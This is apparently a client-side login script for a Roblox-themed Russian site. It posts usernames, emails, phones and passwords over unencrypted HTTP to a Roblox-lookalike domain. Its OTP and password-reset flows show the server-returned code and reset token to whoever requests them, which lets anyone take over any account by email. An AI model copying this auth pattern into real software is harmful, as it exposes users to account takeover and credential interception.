const API_URL = 'http://roblox-online.ru/';
let currentOTPEmail = '';

document.addEventListener('DOMContentLoaded', () => {
    checkAuth();
    generateGameCards();
});

function generateGameCards() {
    const games = [
        'Field Trip Z', 'Jailbreak', 'Shark Bite', 'Royale High', 
        'Slivinqland', 'Arsenal', 'Doors', 'Drive Empire',
        'NFL Universe', 'Piggy', 'Dungeon Quest', 'Anomalies',
        'Dueling Grounds', 'Fisch', 'Adopt Me!', "Dandy's World",
        'Blox Fruits', 'Murder Mystery 2', 'Tower of Hell', 'Brookhaven',
        'Pet Simulator X', 'Pizza Place', 'Natural Disaster', 'Phantom Forces'
    ];
    
    const container = document.getElementById('gameBackground');
    games.forEach(game => {
        const card = document.createElement('div');
        card.className = 'game-card';
        card.innerHTML = `<span class="game-title">${game}</span>`;
        container.appendChild(card);
    });
}

function showLogin() {
    hideAllForms();
    document.getElementById('loginForm').style.display = 'block';
    document.getElementById('loginContainer').style.display = 'block';
}

function showRegister() {
    hideAllForms();
    document.getElementById('registerForm').style.display = 'block';
    document.getElementById('loginContainer').style.display = 'block';
}

function showOTPRequest() {
    hideAllForms();
    document.getElementById('otpForm').style.display = 'block';
    document.getElementById('loginContainer').style.display = 'block';
    document.getElementById('otpCodeInput').style.display = 'none';
}

function showQuickLogin() {
    hideAllForms();
    document.getElementById('quickLoginForm').style.display = 'block';
    document.getElementById('loginContainer').style.display = 'block';
    document.getElementById('quickCodeInput').style.display = 'none';
}

function showForgotPassword() {
    hideAllForms();
    document.getElementById('forgotForm').style.display = 'block';
    document.getElementById('loginContainer').style.display = 'block';
}

function hideAllForms() {
    document.getElementById('loginForm').style.display = 'none';
    document.getElementById('registerForm').style.display = 'none';
    document.getElementById('otpForm').style.display = 'none';
    document.getElementById('quickLoginForm').style.display = 'none';
    document.getElementById('forgotForm').style.display = 'none';
    clearMessages();
}

async function handleRegister() {
    const username = document.getElementById('regUsername').value.trim();
    const email = document.getElementById('regEmail').value.trim();
    const phone = document.getElementById('regPhone').value.trim();
    const password = document.getElementById('regPassword').value;

    try {
        const res = await fetch(`${API_URL}/register`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ username, email, phone, password })
        });

        const data = await res.json();
        
        if (res.ok) {
            showMessage('✅ Регистрация успешна!', 'success');
            setTimeout(() => showLogin(), 1500);
        } else {
            showMessage('❌ ' + data.error, 'error');
        }
    } catch (err) {
        showMessage('❌ Ошибка соединения с сервером', 'error');
    }
}

async function handleLogin() {
    const identifier = document.getElementById('loginIdentifier').value.trim();
    const password = document.getElementById('loginPassword').value;

    try {
        const res = await fetch(`${API_URL}/login`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ identifier, password })
        });

        const data = await res.json();
        
        if (res.ok) {
            showMessage('✅ Вход выполнен!', 'success');
            showProfile(data.user);
        } else {
            showMessage(' ' + data.error, 'error');
        }
    } catch (err) {
        showMessage('❌ Ошибка соединения с сервером', 'error');
    }
}

async function sendOTPCode() {
    const email = document.getElementById('otpEmail').value.trim();
    if (!email) return showMessage('❌ Введите email', 'error');

    try {
        const res = await fetch(`${API_URL}/send-otp`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ email })
        });

        const data = await res.json();
        
        if (res.ok) {
            currentOTPEmail = email;
            showMessage(`✅ Код отправлен! (смотрите консоль сервера: ${data.testCode})`, 'success');
            document.getElementById('otpCodeInput').style.display = 'block';
        } else {
            showMessage(' ' + data.error, 'error');
        }
    } catch (err) {
        showMessage('❌ Ошибка соединения', 'error');
    }
}

async function verifyOTPForLogin() {
    const code = document.getElementById('otpCode').value.trim();
    
    try {
        const res = await fetch(`${API_URL}/verify-otp`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ email: currentOTPEmail, code })
        });

        const data = await res.json();
        
        if (res.ok) {
            showMessage('✅ Код подтвержден! Теперь войдите обычным способом', 'success');
            setTimeout(() => showLogin(), 1500);
        } else {
            showMessage(' ' + data.error, 'error');
        }
    } catch (err) {
        showMessage('❌ Ошибка проверки кода', 'error');
    }
}

async function sendQuickLoginCode() {
    const email = document.getElementById('quickEmail').value.trim();
    if (!email) return showMessage('❌ Введите email', 'error');

    try {
        const res = await fetch(`${API_URL}/send-otp`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ email })
        });

        const data = await res.json();
        
        if (res.ok) {
            currentOTPEmail = email;
            showMessage(`✅ Код отправлен! (код: ${data.testCode})`, 'success');
            document.getElementById('quickCodeInput').style.display = 'block';
        } else {
            showMessage(' ' + data.error, 'error');
        }
    } catch (err) {
        showMessage('❌ Ошибка', 'error');
    }
}

async function handleQuickLogin() {
    const email = document.getElementById('quickEmail').value.trim();
    const code = document.getElementById('quickCode').value.trim();

    try {
        const res = await fetch(`${API_URL}/quick-login`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ email, code })
        });

        const data = await res.json();
        
        if (res.ok) {
            showMessage('✅ Вход выполнен!', 'success');
            showProfile(data.user);
        } else {
            showMessage(' ' + data.error, 'error');
        }
    } catch (err) {
        showMessage('❌ Ошибка', 'error');
    }
}

async function handleForgotPassword() {
    const email = document.getElementById('forgotEmail').value.trim();
    if (!email) return showMessage(' Введите email', 'error');

    try {
        const res = await fetch(`${API_URL}/forgot-password`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ email })
        });

        const data = await res.json();
        
        if (res.ok) {
            showMessage(`✅ Инструкция отправлена! (ссылка: ${data.testLink})`, 'success');
            if (data.testLink) {
                setTimeout(() => {
                    showResetPasswordPage(data.testLink);
                }, 2000);
            }
        } else {
            showMessage('❌ ' + data.error, 'error');
        }
    } catch (err) {
        showMessage('❌ Ошибка', 'error');
    }
}

function showResetPasswordPage(url) {
    const token = new URL(url).searchParams.get('token');
    document.getElementById('loginContainer').style.display = 'none';
    document.getElementById('resetContainer').style.display = 'block';
    document.getElementById('resetContainer').dataset.token = token;
}

async function handleResetPassword() {
    const token = document.getElementById('resetContainer').dataset.token;
    const newPassword = document.getElementById('newPassword').value;
    const confirmPassword = document.getElementById('confirmPassword').value;

    if (newPassword !== confirmPassword) {
        return showMessage('❌ Пароли не совпадают', 'error');
    }

    try {
        const res = await fetch(`${API_URL}/reset-password`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ token, newPassword })
        });

        const data = await res.json();
        
        if (res.ok) {
            showMessage('✅ Пароль изменен!', 'success');
            setTimeout(() => location.reload(), 2000);
        } else {
            showMessage('❌ ' + data.error, 'error');
        }
    } catch (err) {
        showMessage('❌ Ошибка', 'error');
    }
}

async function checkAuth() {
    try {
        const res = await fetch(`${API_URL}/me`);
        if (res.ok) {
            const data = await res.json();
            showProfile(data.user);
        }
    } catch (err) {
        // Не авторизован
    }
}

function showProfile(user) {
    document.getElementById('loginContainer').style.display = 'none';
    document.getElementById('resetContainer').style.display = 'none';
    document.getElementById('profileContainer').style.display = 'block';
    
    document.getElementById('profileUsername').textContent = user.username;
    document.getElementById('profileEmail').textContent = user.email;
    document.getElementById('profileCreated').textContent = new Date(user.created_at).toLocaleDateString();
    document.getElementById('profileLastLogin').textContent = user.last_login ? 
        new Date(user.last_login).toLocaleString() : 'First login';
}

async function handleLogout() {
    try {
        await fetch(`${API_URL}/logout`, { method: 'POST' });
        location.reload();
    } catch (err) {
        showMessage(' Ошибка выхода', 'error');
    }
}

function showMessage(text, type) {
    const msgEl = document.getElementById('message');
    msgEl.textContent = text;
    msgEl.className = `message ${type}`;
    msgEl.style.display = 'block';
    setTimeout(() => msgEl.style.display = 'none', 5000);
}

function clearMessages() {
    document.getElementById('message').style.display = 'none';
}

document.addEventListener('keypress', (e) => {
    if (e.key === 'Enter') {
        const activeForm = document.querySelector('[style*="display: block"]');
        if (activeForm) {
            const btn = activeForm.querySelector('.btn-login');
            if (btn) btn.click();
        }
    }
});